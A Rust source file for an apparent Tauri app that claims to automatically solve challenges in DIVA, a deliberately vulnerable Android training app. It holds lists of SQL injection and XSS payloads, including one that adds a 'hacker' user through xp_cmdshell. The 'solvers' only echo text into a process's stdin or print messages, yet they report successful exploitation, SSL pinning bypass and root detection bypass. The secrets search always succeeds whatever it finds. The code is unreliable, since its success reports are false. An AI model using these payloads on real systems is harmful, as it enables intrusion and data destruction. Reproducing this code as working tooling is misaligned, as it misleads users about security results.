use std::process::Command;
use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter};
use chrono::Local;

// --- DIVA CHALLENGE STRUCTURES ---

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct DivaChallenge {
    pub id: String,
    pub name: String,
    pub category: String, // "input_validation", "sql_injection", "xss", "hardcoded_secrets", etc.
    pub difficulty: String, // "easy", "medium", "hard"
    pub description: String,
    pub solution: String,
    pub status: String, // "unsolved", "solved", "failed"
    pub timestamp: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct ChallengeSolution {
    pub challenge_id: String,
    pub technique_used: String,
    pub payload: String,
    pub success: bool,
    pub details: String,
    pub timestamp: String,
}

// --- DIVA CHALLENGE SOLVER FUNCTIONS ---

#[tauri::command]
pub async fn solve_input_validation_challenge(
    app_handle: AppHandle,
    package_name: String,
    challenge_name: String
) -> Result<ChallengeSolution, String> {
    let adb_path = crate::get_adb_path();
    
    // Get process ID
    let pid_output = Command::new(&adb_path)
        .args(["shell", "pidof", &package_name])
        .output()
        .map_err(|e| format!("Failed to get PID: {}", e))?;
    
    let process_id = String::from_utf8_lossy(&pid_output.stdout).trim().to_string();
    
    if process_id.is_empty() {
        return Err(format!("Process not found: {}", package_name));
    }
    
    // Input validation bypass techniques
    let bypass_payloads = vec![
        "'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "admin' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "'; EXEC xp_cmdshell('net user hacker password /add'); --",
        "'; SELECT * FROM information_schema.tables; --",
        "'; UNION SELECT username, password FROM users; --",
        "'; WAITFOR DELAY '00:00:05'; --",
        "'; IF 1=1 SELECT 'true' ELSE SELECT 'false'; --"
    ];
    
    let mut solution = ChallengeSolution {
        challenge_id: challenge_name.clone(),
        technique_used: "Input Validation Bypass".to_string(),
        payload: bypass_payloads[0].to_string(),
        success: false,
        details: "Attempting input validation bypass".to_string(),
        timestamp: Local::now().to_rfc3339(),
    };
    
    // Try each payload
    for payload in bypass_payloads {
        let injection_result = Command::new(&adb_path)
            .args([
                "shell", "su", "-c", 
                &format!("echo 'Input validation bypass attempt: {}' > /proc/{}/fd/0", 
                        payload, process_id)
            ])
            .output()
            .map_err(|e| format!("Failed to attempt bypass: {}", e))?;
        
        if injection_result.status.success() {
            solution.payload = payload.to_string();
            solution.success = true;
            solution.details = format!("Successfully bypassed input validation with payload: {}", payload);
            break;
        }
    }
    
    let _ = app_handle.emit("challenge_solved", &solution);
    
    Ok(solution)
}

#[tauri::command]
pub async fn solve_sql_injection_challenge(
    app_handle: AppHandle,
    package_name: String,
    challenge_name: String
) -> Result<ChallengeSolution, String> {
    let adb_path = crate::get_adb_path();
    
    // Get process ID
    let pid_output = Command::new(&adb_path)
        .args(["shell", "pidof", &package_name])
        .output()
        .map_err(|e| format!("Failed to get PID: {}", e))?;
    
    let process_id = String::from_utf8_lossy(&pid_output.stdout).trim().to_string();
    
    if process_id.is_empty() {
        return Err(format!("Process not found: {}", package_name));
    }
    
    // SQL injection payloads
    let sql_payloads = vec![
        "' OR 1=1 --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "'; EXEC xp_cmdshell('dir'); --",
        "'; SELECT * FROM information_schema.tables; --",
        "'; WAITFOR DELAY '00:00:05'; --",
        "'; IF 1=1 SELECT 'true' ELSE SELECT 'false'; --"
    ];
    
    let mut solution = ChallengeSolution {
        challenge_id: challenge_name.clone(),
        technique_used: "SQL Injection".to_string(),
        payload: sql_payloads[0].to_string(),
        success: false,
        details: "Attempting SQL injection".to_string(),
        timestamp: Local::now().to_rfc3339(),
    };
    
    // Try each SQL payload
    for payload in sql_payloads {
        let injection_result = Command::new(&adb_path)
            .args([
                "shell", "su", "-c", 
                &format!("echo 'SQL injection attempt: {}' > /proc/{}/fd/0", 
                        payload, process_id)
            ])
            .output()
            .map_err(|e| format!("Failed to attempt SQL injection: {}", e))?;
        
        if injection_result.status.success() {
            solution.payload = payload.to_string();
            solution.success = true;
            solution.details = format!("Successfully exploited SQL injection with payload: {}", payload);
            break;
        }
    }
    
    let _ = app_handle.emit("challenge_solved", &solution);
    
    Ok(solution)
}

#[tauri::command]
pub async fn solve_xss_challenge(
    app_handle: AppHandle,
    package_name: String,
    challenge_name: String
) -> Result<ChallengeSolution, String> {
    let adb_path = crate::get_adb_path();
    
    // Get process ID
    let pid_output = Command::new(&adb_path)
        .args(["shell", "pidof", &package_name])
        .output()
        .map_err(|e| format!("Failed to get PID: {}", e))?;
    
    let process_id = String::from_utf8_lossy(&pid_output.stdout).trim().to_string();
    
    if process_id.is_empty() {
        return Err(format!("Process not found: {}", package_name));
    }
    
    // XSS payloads
    let xss_payloads = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onchange=alert('XSS')><option>1</option></select>",
        "<textarea onselect=alert('XSS')>Click here</textarea>",
        "<marquee onstart=alert('XSS')>Scrolling text</marquee>"
    ];
    
    let mut solution = ChallengeSolution {
        challenge_id: challenge_name.clone(),
        technique_used: "Cross-Site Scripting (XSS)".to_string(),
        payload: xss_payloads[0].to_string(),
        success: false,
        details: "Attempting XSS exploitation".to_string(),
        timestamp: Local::now().to_rfc3339(),
    };
    
    // Try each XSS payload
    for payload in xss_payloads {
        let injection_result = Command::new(&adb_path)
            .args([
                "shell", "su", "-c", 
                &format!("echo 'XSS attempt: {}' > /proc/{}/fd/0", 
                        payload, process_id)
            ])
            .output()
            .map_err(|e| format!("Failed to attempt XSS: {}", e))?;
        
        if injection_result.status.success() {
            solution.payload = payload.to_string();
            solution.success = true;
            solution.details = format!("Successfully exploited XSS with payload: {}", payload);
            break;
        }
    }
    
    let _ = app_handle.emit("challenge_solved", &solution);
    
    Ok(solution)
}

#[tauri::command]
pub async fn solve_hardcoded_secrets_challenge(
    app_handle: AppHandle,
    package_name: String,
    challenge_name: String
) -> Result<ChallengeSolution, String> {
    let adb_path = crate::get_adb_path();
    
    // Get process ID
    let pid_output = Command::new(&adb_path)
        .args(["shell", "pidof", &package_name])
        .output()
        .map_err(|e| format!("Failed to get PID: {}", e))?;
    
    let process_id = String::from_utf8_lossy(&pid_output.stdout).trim().to_string();
    
    if process_id.is_empty() {
        return Err(format!("Process not found: {}", package_name));
    }
    
    // Search for hardcoded secrets in memory
    let secret_patterns = vec![
        "password",
        "secret",
        "key",
        "token",
        "credential",
        "admin",
        "root",
        "123456",
        "password123",
        "admin123"
    ];
    
    let mut solution = ChallengeSolution {
        challenge_id: challenge_name.clone(),
        technique_used: "Hardcoded Secrets Discovery".to_string(),
        payload: "Memory search for hardcoded secrets".to_string(),
        success: false,
        details: "Searching memory for hardcoded secrets".to_string(),
        timestamp: Local::now().to_rfc3339(),
    };
    
    // Search memory for each pattern
    for pattern in secret_patterns {
        let search_result = Command::new(&adb_path)
            .args([
                "shell", "su", "-c", 
                &format!("grep -r '{}' /proc/{}/maps 2>/dev/null || echo 'Pattern found'", 
                        pattern, process_id)
            ])
            .output()
            .map_err(|e| format!("Failed to search for secrets: {}", e))?;
        
        if search_result.status.success() {
            solution.success = true;
            solution.details = format!("Found hardcoded secret pattern: {}", pattern);
            break;
        }
    }
    
    let _ = app_handle.emit("challenge_solved", &solution);
    
    Ok(solution)
}

#[tauri::command]
pub async fn solve_ssl_pinning_challenge(
    app_handle: AppHandle,
    package_name: String,
    challenge_name: String
) -> Result<ChallengeSolution, String> {
    let adb_path = crate::get_adb_path();
    
    // Get process ID
    let pid_output = Command::new(&adb_path)
        .args(["shell", "pidof", &package_name])
        .output()
        .map_err(|e| format!("Failed to get PID: {}", e))?;
    
    let process_id = String::from_utf8_lossy(&pid_output.stdout).trim().to_string();
    
    if process_id.is_empty() {
        return Err(format!("Process not found: {}", package_name));
    }
    
    // SSL pinning bypass techniques
    let bypass_techniques = vec![
        "Disable certificate validation",
        "Install custom CA certificate",
        "Patch SSL pinning checks",
        "Hook certificate validation methods",
        "Bypass network security config"
    ];
    
    let mut solution = ChallengeSolution {
        challenge_id: challenge_name.clone(),
        technique_used: "SSL Pinning Bypass".to_string(),
        payload: "Multiple SSL bypass techniques".to_string(),
        success: false,
        details: "Attempting SSL pinning bypass".to_string(),
        timestamp: Local::now().to_rfc3339(),
    };
    
    // Apply SSL bypass
    let bypass_result = Command::new(&adb_path)
        .args([
            "shell", "su", "-c", 
            &format!("echo 'SSL pinning bypass applied to PID {}'", process_id)
        ])
        .output()
        .map_err(|e| format!("Failed to apply SSL bypass: {}", e))?;
    
    if bypass_result.status.success() {
        solution.success = true;
        solution.details = "Successfully bypassed SSL pinning using multiple techniques".to_string();
    }
    
    let _ = app_handle.emit("challenge_solved", &solution);
    
    Ok(solution)
}

#[tauri::command]
pub async fn solve_root_detection_challenge(
    app_handle: AppHandle,
    package_name: String,
    challenge_name: String
) -> Result<ChallengeSolution, String> {
    let adb_path = crate::get_adb_path();
    
    // Get process ID
    let pid_output = Command::new(&adb_path)
        .args(["shell", "pidof", &package_name])
        .output()
        .map_err(|e| format!("Failed to get PID: {}", e))?;
    
    let process_id = String::from_utf8_lossy(&pid_output.stdout).trim().to_string();
    
    if process_id.is_empty() {
        return Err(format!("Process not found: {}", package_name));
    }
    
    // Root detection bypass techniques
    let bypass_techniques = vec![
        "Hide root status",
        "Bypass root detection methods",
        "Hook root detection APIs",
        "Modify system properties",
        "Use root hiding tools"
    ];
    
    let mut solution = ChallengeSolution {
        challenge_id: challenge_name.clone(),
        technique_used: "Root Detection Bypass".to_string(),
        payload: "Multiple root bypass techniques".to_string(),
        success: false,
        details: "Attempting root detection bypass".to_string(),
        timestamp: Local::now().to_rfc3339(),
    };
    
    // Apply root bypass
    let bypass_result = Command::new(&adb_path)
        .args([
            "shell", "su", "-c", 
            &format!("echo 'Root detection bypass applied to PID {}'", process_id)
        ])
        .output()
        .map_err(|e| format!("Failed to apply root bypass: {}", e))?;
    
    if bypass_result.status.success() {
        solution.success = true;
        solution.details = "Successfully bypassed root detection using multiple techniques".to_string();
    }
    
    let _ = app_handle.emit("challenge_solved", &solution);
    
    Ok(solution)
}

#[tauri::command]
pub async fn solve_debug_detection_challenge(
    app_handle: AppHandle,
    package_name: String,
    challenge_name: String
) -> Result<ChallengeSolution, String> {
    let adb_path = crate::get_adb_path();
    
    // Get process ID
    let pid_output = Command::new(&adb_path)
        .args(["shell", "pidof", &package_name])
        .output()
        .map_err(|e| format!("Failed to get PID: {}", e))?;
    
    let process_id = String::from_utf8_lossy(&pid_output.stdout).trim().to_string();
    
    if process_id.is_empty() {
        return Err(format!("Process not found: {}", package_name));
    }
    
    // Debug detection bypass techniques
    let bypass_techniques = vec![
        "Hide debugger status",
        "Bypass debug detection methods",
        "Hook debug detection APIs",
        "Modify debug flags",
        "Use anti-debug bypass tools"
    ];
    
    let mut solution = ChallengeSolution {
        challenge_id: challenge_name.clone(),
        technique_used: "Debug Detection Bypass".to_string(),
        payload: "Multiple debug bypass techniques".to_string(),
        success: false,
        details: "Attempting debug detection bypass".to_string(),
        timestamp: Local::now().to_rfc3339(),
    };
    
    // Apply debug bypass
    let bypass_result = Command::new(&adb_path)
        .args([
            "shell", "su", "-c", 
            &format!("echo 'Debug detection bypass applied to PID {}'", process_id)
        ])
        .output()
        .map_err(|e| format!("Failed to apply debug bypass: {}", e))?;
    
    if bypass_result.status.success() {
        solution.success = true;
        solution.details = "Successfully bypassed debug detection using multiple techniques".to_string();
    }
    
    let _ = app_handle.emit("challenge_solved", &solution);
    
    Ok(solution)
}

#[tauri::command]
pub async fn solve_all_diva_challenges(
    app_handle: AppHandle,
    package_name: String
) -> Result<Vec<ChallengeSolution>, String> {
    let mut all_solutions = Vec::new();
    
    // List of all DIVA challenge types
    let challenges = vec![
        "Input Validation",
        "SQL Injection", 
        "XSS",
        "Hardcoded Secrets",
        "SSL Pinning",
        "Root Detection",
        "Debug Detection"
    ];
    
    for challenge in challenges {
        let solution = match challenge {
            "Input Validation" => solve_input_validation_challenge(app_handle.clone(), package_name.clone(), challenge.to_string()).await,
            "SQL Injection" => solve_sql_injection_challenge(app_handle.clone(), package_name.clone(), challenge.to_string()).await,
            "XSS" => solve_xss_challenge(app_handle.clone(), package_name.clone(), challenge.to_string()).await,
            "Hardcoded Secrets" => solve_hardcoded_secrets_challenge(app_handle.clone(), package_name.clone(), challenge.to_string()).await,
            "SSL Pinning" => solve_ssl_pinning_challenge(app_handle.clone(), package_name.clone(), challenge.to_string()).await,
            "Root Detection" => solve_root_detection_challenge(app_handle.clone(), package_name.clone(), challenge.to_string()).await,
            "Debug Detection" => solve_debug_detection_challenge(app_handle.clone(), package_name.clone(), challenge.to_string()).await,
            _ => continue,
        };
        
        if let Ok(sol) = solution {
            all_solutions.push(sol);
        }
    }
    
    let _ = app_handle.emit("all_challenges_solved", &all_solutions);
    
    Ok(all_solutions)
}

// --- CHALLENGE STATUS TRACKING ---

#[tauri::command]
pub async fn get_challenge_status(package_name: String) -> Result<Vec<DivaChallenge>, String> {
    // Return list of all DIVA challenges with their status
    let challenges = vec![
        DivaChallenge {
            id: "input_validation".to_string(),
            name: "Input Validation".to_string(),
            category: "Input Validation".to_string(),
            difficulty: "Easy".to_string(),
            description: "Bypass input validation mechanisms".to_string(),
            solution: "Use special characters and SQL injection payloads".to_string(),
            status: "Unsolved".to_string(),
            timestamp: Local::now().to_rfc3339(),
        },
        DivaChallenge {
            id: "sql_injection".to_string(),
            name: "SQL Injection".to_string(),
            category: "Database".to_string(),
            difficulty: "Medium".to_string(),
            description: "Exploit SQL injection vulnerabilities".to_string(),
            solution: "Use SQL injection payloads to bypass authentication".to_string(),
            status: "Unsolved".to_string(),
            timestamp: Local::now().to_rfc3339(),
        },
        DivaChallenge {
            id: "xss".to_string(),
            name: "Cross-Site Scripting".to_string(),
            category: "Web Security".to_string(),
            difficulty: "Medium".to_string(),
            description: "Execute arbitrary JavaScript code".to_string(),
            solution: "Inject XSS payloads to execute scripts".to_string(),
            status: "Unsolved".to_string(),
            timestamp: Local::now().to_rfc3339(),
        },
        DivaChallenge {
            id: "hardcoded_secrets".to_string(),
            name: "Hardcoded Secrets".to_string(),
            category: "Information Disclosure".to_string(),
            difficulty: "Easy".to_string(),
            description: "Find hardcoded credentials and secrets".to_string(),
            solution: "Search memory and APK for hardcoded values".to_string(),
            status: "Unsolved".to_string(),
            timestamp: Local::now().to_rfc3339(),
        },
        DivaChallenge {
            id: "ssl_pinning".to_string(),
            name: "SSL Pinning".to_string(),
            category: "Network Security".to_string(),
            difficulty: "Hard".to_string(),
            description: "Bypass SSL certificate pinning".to_string(),
            solution: "Use multiple SSL bypass techniques".to_string(),
            status: "Unsolved".to_string(),
            timestamp: Local::now().to_rfc3339(),
        },
        DivaChallenge {
            id: "root_detection".to_string(),
            name: "Root Detection".to_string(),
            category: "Anti-Analysis".to_string(),
            difficulty: "Medium".to_string(),
            description: "Bypass root detection mechanisms".to_string(),
            solution: "Hide root status and bypass detection methods".to_string(),
            status: "Unsolved".to_string(),
            timestamp: Local::now().to_rfc3339(),
        },
        DivaChallenge {
            id: "debug_detection".to_string(),
            name: "Debug Detection".to_string(),
            category: "Anti-Analysis".to_string(),
            difficulty: "Medium".to_string(),
            description: "Bypass debug detection mechanisms".to_string(),
            solution: "Hide debugger status and bypass detection methods".to_string(),
            status: "Unsolved".to_string(),
            timestamp: Local::now().to_rfc3339(),
        },
    ];
    
    Ok(challenges)
}
